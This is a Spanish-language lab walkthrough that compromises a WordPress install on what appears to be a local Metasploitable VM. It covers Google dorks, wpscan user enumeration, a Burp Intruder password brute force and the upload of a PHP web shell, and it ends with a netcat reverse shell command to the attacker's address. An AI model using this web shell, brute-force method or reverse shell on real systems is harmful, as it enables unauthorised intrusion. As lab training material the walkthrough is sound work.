
# Vulnerabilidad en Wordpress a partir de una ubicación de un dork

## OSINT
Ubicar wordpress en Internet con dorks, solo incluyemos algunos registros
```
inurl:/wp-content/plugins/plugin-name/
inurl: “WordPress readme.html”
inurl: “wp readme.html”
```
## RECONOCIMIENTO y ENUMERACIÓN
Ubicar directorios en un site que tiene wordpress, ejecutar Dirbuster e ingresar esos parámetros
```
dirbuster
```
![image](https://user-images.githubusercontent.com/50930193/166960158-8f5758fb-4411-4b3b-8520-bebd7b13fdab.png)

![image](https://user-images.githubusercontent.com/50930193/166959938-f4a913c2-be1c-4f4e-8c79-b33664ee4abd.png)

Ahora ingresemos a la ruta siguiente
```
http://192.168.109.171/wordpress/wp-login.php?loggedout=true
```
![image](https://user-images.githubusercontent.com/50930193/166961022-03227b4b-a5e5-412e-a9b5-a26ec80a48ab.png)

Lo siguiente, es hacer un escaneo con **wp-scan** (similar al taller anterior) hacia la máquina metasploitable

```
wpscan --url http://192.168.109.171/wordpress --enumerate u
```
El resultado es el siguiente:
```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.

y
[+] URL: http://192.168.109.171/wordpress/ [192.168.109.171]
[+] Started: Wed May  4 23:35:14 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.2.8 (Ubuntu) DAV/2
 |  - X-Powered-By: PHP/5.2.4-2ubuntu5.10
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.109.171/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.109.171/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.109.171/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.109.171/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.18 identified (Insecure, released on 2020-04-29).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.109.171/wordpress/, Match: '-release.min.js?ver=4.6.18'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.109.171/wordpress/, Match: 'WordPress 4.6.18'

[+] WordPress theme in use: twentysixteen
 | Location: http://192.168.109.171/wordpress/wp-content/themes/twentysixteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://192.168.109.171/wordpress/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://192.168.109.171/wordpress/wp-content/themes/twentysixteen/style.css?ver=4.6.18
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.109.171/wordpress/wp-content/themes/twentysixteen/style.css?ver=4.6.18, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=========================================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] wordpress
 | Found By: Author Posts - Author Pattern (Passive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed May  4 23:35:22 2022
[+] Requests Done: 50
[+] Cached Requests: 7
[+] Data Sent: 13.709 KB
[+] Data Received: 198.803 KB
[+] Memory used: 177.867 MB
[+] Elapsed time: 00:00:07
```
Hemos identificado al usuario **wordpress**, ahora tratemos de identificar una clave, para ello empleemos burp

![image](https://user-images.githubusercontent.com/50930193/166963851-13f4baf6-aa9c-44b8-98a8-52a57122d68c.png)

Con ello podemos usar fuerza bruta para ubicar la clave, para ello usaremos burpsuite, por ello en el terminal ingresar el comando siguiente
```
sudo sysctl -w kernel.unprivileged_userns_clone=1
sudo find .BurpSuite -name chrome-sandbox -exec chown root:root {} \; -exec chmod 4755 {} \;
burpsuite
```
![image](https://user-images.githubusercontent.com/50930193/166965766-daa5aa5a-f9a5-4302-9479-151668b41545.png)

El burpsuite funciona como un proxy e intercepta contenido entre el usuario y el servidor web, aqui vemos como intercepta usuarios y claves

![image](https://user-images.githubusercontent.com/50930193/166966025-2dc260f8-d2b3-43d7-a8f6-8a1b42ae8b72.png)

Asimismo. para que funcione totalmente hay que hay que instalar en firefox un addon que nos va a facilitar las cosas 

![image](https://user-images.githubusercontent.com/50930193/166965670-1804fde8-e6b4-48ea-9b62-ea0b2a4297fb.png)

Incluya esos parametros
![image](https://user-images.githubusercontent.com/50930193/166967569-17f11e28-bab9-400e-921a-96de0241477b.png)

Asimismo, en Burp hay que configurar estos parametros

![image](https://user-images.githubusercontent.com/50930193/166971619-4f8150d5-7643-48ef-af51-3bf35c55bb45.png)

Ahora ya se puede interceptar tráfico

![image](https://user-images.githubusercontent.com/50930193/166972261-635faeec-0e3e-42cc-ade7-9a24e204c757.png)

En ese sentido vamos a intentar ubicar la clave del usuario **wordpress** 

## EXPLOTACIÓN

Primero, veamos que sale cuando la clave es incorrecta, para ello utilicemos la opción de Repeater para probar y ver los resultados del response

![image](https://user-images.githubusercontent.com/50930193/167014787-ef4404b7-fb37-4237-b567-81dc59534e18.png)

Ahora, empleemos intruder para realizar una fuerza bruta de contraseñas. Para ello, sigamos los pasos siguientes:

En **Positions**, elijamos como tipo de ataque, **sniper** y cambios y añadamos como campo **pwd** a evaluar

![image](https://user-images.githubusercontent.com/50930193/167015103-c2ed664c-9ab3-4182-9694-0a11108df295.png)

En **Payloads** elijamos una lista simple y en la opción Load incluiremos la referencia a este archivo
```
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```
![image](https://user-images.githubusercontent.com/50930193/167016928-93c01c9a-5155-4089-9144-63f057dcac3d.png)

También en **Payloads** elegimos **attack**, la forma de como ubicar el password es ver la longitud (campo **Length**) del arcchivo de respuesta, en este caso vemos que el payload que estamos buscando es **password**

![image](https://user-images.githubusercontent.com/50930193/167017756-fcbdbdfe-4285-423f-949d-fcf799ae9353.png)

Ahora tratemos de ingresar con el usuario **wordpress** y la contraseña **password** y verán que el resultado de autenticación es 

![image](https://user-images.githubusercontent.com/50930193/167017902-295f2d53-390e-4d86-a97c-6c70abed6931.png)

![image](https://user-images.githubusercontent.com/50930193/167017969-df31421a-ebd6-4f98-be29-049ec6c29a9e.png)

Esta version de wordpress tiene un pluging llamado **Administrador de Archivos** o **WP FIle Manager**, si tenemos una opción para subir archivos ya tenemos una funcionalidad probable de hacking, para ellos subimos un exploit que nos permita ejecutar comandos en el servidor

FILE:ulima.php
```
<?php
if(isset($_GET['cmd']))
	{
		system($_GET['cmd']);
	}
?>
```
Seleccionar el archivo y guardarlo
![image](https://user-images.githubusercontent.com/50930193/167019901-11a0f0f5-06f7-4c2c-acb7-0a8e65379874.png)
![image](https://user-images.githubusercontent.com/50930193/167020010-60f88f7e-0eba-479a-926c-fb7117dde0bd.png)
![image](https://user-images.githubusercontent.com/50930193/167020134-e79c938c-95b8-4a4e-bf3a-c58830ac30d3.png)

En ese sentido veamos si el exploit funciona, ingresemos a firefox a este enlace
```
http://192.168.109.171/wordpress/wp-content/uploads/2022/05/ulima.php?cmd=id
```
![image](https://user-images.githubusercontent.com/50930193/167020476-4cf72caf-7d00-4fc4-b58b-47bfd5c2fc1b.png)

El exploit si funciona, ahora veamos como se puede llamar desde consola
```
curl -G http://192.168.109.171/wordpress/wp-content/uploads/2022/05/ulima.php --data-urlencode "cmd=id"
```
![image](https://user-images.githubusercontent.com/50930193/167021178-abbe0416-0295-4d34-be5c-a81882514341.png)

a sabienda de eso veamos de hacer una shell reversa con netcat, para ello lo primero que debemos hacer es establecer un listener en el puerto 4444
```
netcat -nlvp 4444
```
y ejecutando el comando
```
curl -G http://192.168.109.171/wordpress/wp-content/uploads/2022/05/ulima.php --data-urlencode "cmd=nc -e /bin/sh 192.168.109.170 4444"   
```
![image](https://user-images.githubusercontent.com/50930193/167022069-6dc1d2f8-5d92-4faa-822c-12c838dfb7fe.png)

Finalmente obtenemos una shell!
